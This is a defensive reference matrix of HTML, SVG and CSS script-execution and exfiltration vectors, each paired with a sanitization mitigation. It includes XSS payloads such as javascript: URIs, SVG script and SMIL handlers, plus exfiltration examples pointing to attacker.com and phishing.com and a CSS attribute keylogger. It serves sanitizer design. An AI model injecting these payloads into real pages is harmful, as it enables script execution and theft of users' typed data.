# Comprehensive Zero-JS Threat & Execution Vector Matrix

This reference documents every known vector through which active code or JavaScript execution can occur in HTML documents, SVG graphics, CSS stylesheets, and embedded payloads.

---

## 1. Direct Scripting Vectors

| Vector Type | Examples | Threat Mechanism | Zero-JS Mitigation |
| :--- | :--- | :--- | :--- |
| **Executable `<script>`** | `<script>alert(1)</script>`, `<script src="evil.js">`, `<script type="module">` | Direct code execution in JavaScript engine. | Remove all `<script>` tags unconditionally. |
| **Inert `<script>` (Heuristic Triggers)** | `<script type="application/ld+json">`, `<script type="text/template">` | Non-executable metadata, but triggers naive regex scanner warnings in email engines. | Strip in email contexts; preserve only if strict SEO/data consumption is required. |
| **Event Handlers (Standard)** | `onload=`, `onerror=`, `onclick=`, `onmouseover=`, `onfocus=`, `onblur=` | Triggers on DOM events (e.g. image failure, click, load). | Strip all attributes starting with `on*` on every element. |
| **Event Handlers (Modern/Edge)** | `ontoggle=` (details), `onpointerdown=`, `onanimationstart=`, `onwheel=`, `onformdata=` | HTML5 / CSS animation lifecycle triggers. | Comprehensive `^on[a-z]+` attribute stripping. |
| **Protocol Pseudo-schemes** | `href="javascript:..."`, `src="vbscript:..."`, `formaction="javascript:..."` | Executes code when clicked, navigated, or submitted. | Reject all URIs matching `^(javascript|vbscript|data:(?!image/(png|jpeg|gif|webp|svg\+xml))):`. |

---

## 2. SVG & Vector Graphics Vectors

SVG is XML-based and executes scripts natively when rendered in a browser or inline DOM.

| SVG Vector | Examples | Threat Mechanism | Zero-JS Mitigation |
| :--- | :--- | :--- | :--- |
| **Embedded SVG `<script>`** | `<svg><script>alert(1)</script></svg>` | Direct script execution inside vector tree. | Strip all `<script>` tags within SVG trees. |
| **SMIL Event Triggers** | `<animate onbegin="alert(1)">`, `<set attributeName="href" to="javascript:...">` | SMIL animation events execute inline JavaScript. | Strip SMIL animation tags (`<animate>`, `<set>`, `<animateTransform>`) or sanitize their attributes. |
| **SVG `<a>` and `<use>`** | `<svg><a xlink:href="javascript:..."><rect width="100" height="100"/></a></svg>` | Clickable links inside SVG invoking JS pseudo-protocols. | Sanitize `xlink:href` and `href` attributes in all SVG elements. |
| **`<foreignObject>`** | `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>...</script></body></foreignObject></svg>` | Embeds arbitrary HTML directly inside SVG. | Disallow `<foreignObject>` or recursively sanitize its children. |
| **Base64 Data URIs** | `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Pi4uLjwvc2NyaXB0Pjwvc3ZnPg==">` | Hides malicious SVG script payloads in Base64 strings. | Decode all `data:image/svg+xml;base64` payloads, recursively sanitize the XML/SVG, and re-encode. |

---

## 3. CSS Active Content & Data Exfiltration Vectors

| CSS Vector | Examples | Threat Mechanism | Zero-JS Mitigation |
| :--- | :--- | :--- | :--- |
| **CSS `expression()`** | `width: expression(alert(1))` | Dynamic JScript evaluation in legacy Trident/IE engines. | Strip all `expression(...)` patterns. |
| **HTC Behaviors** | `behavior: url(script.htc)` | Loads external DHTML script components. | Strip `behavior:` CSS properties. |
| **Mozilla XBL Bindings** | `-moz-binding: url(binding.xml#script)` | Loads XBL components with script bindings. | Strip `-moz-binding:` properties. |
| **CSS `url(javascript:...)`** | `background: url("javascript:alert(1)")` | Evaluates JavaScript pseudo-protocol as background resource. | Strip any `url()` containing `javascript:` or `vbscript:`. |
| **External `@import`** | `@import url("https://attacker.com/malicious.css");` | Pulls external, un-audited stylesheets dynamically. | Restrict or inline `@import` stylesheets. |
| **CSS Attribute Keyloggers** | `input[value^="a"] { background: url(/log?key=a); }` | Exfiltrates typed input values via side-channel background requests. | Strip external background image selectors targeting sensitive input states. |

---

## 4. Meta, Form, and Navigation Vectors

| Vector | Examples | Threat Mechanism | Zero-JS Mitigation |
| :--- | :--- | :--- | :--- |
| **Meta Refresh** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Automatic redirect to arbitrary JS execution or phishing. | Strip `<meta http-equiv="refresh">` tags. |
| **Base Tag Hijacking** | `<base href="https://attacker.com/">` | Hijacks all relative script, image, and link URLs. | Strip `<base>` tags or enforce trusted origin. |
| **Form Action Hijacking** | `<form action="https://phishing.com/login" method="POST">` | Transmits user-entered sensitive data to unverified endpoints. | Convert `<form>` to `<div>` containers; strip `action`, `method`, and `onsubmit`. |
| **Button Formaction Override** | `<button formaction="https://attacker.com/steal">` | Overrides parent form endpoint upon button click. | Strip `formaction` attributes from buttons and inputs. |
